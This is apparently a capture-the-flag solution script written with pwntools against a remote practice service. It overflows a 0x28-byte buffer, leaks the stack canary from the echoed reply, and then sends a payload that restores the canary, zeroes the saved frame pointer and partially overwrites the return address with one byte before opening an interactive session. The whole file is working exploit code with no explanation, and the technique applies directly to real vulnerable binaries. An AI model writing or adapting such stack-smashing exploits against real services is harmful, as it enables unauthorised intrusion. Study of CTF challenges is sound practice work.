from pwn import *

context(arch='amd64', os='linux')

target = remote('node4.buuoj.cn', 25927)

target.sendline(b'a' * 0x28)

# Leak canary
target.recvuntil('aaaa\n')
canary = (u64(target.recv(7).rjust(8, b'\x00')))

payload = b'a' * 0x28 + p64(canary) + p64(0) + p8(0x3e)
target.send(payload)
target.interactive()
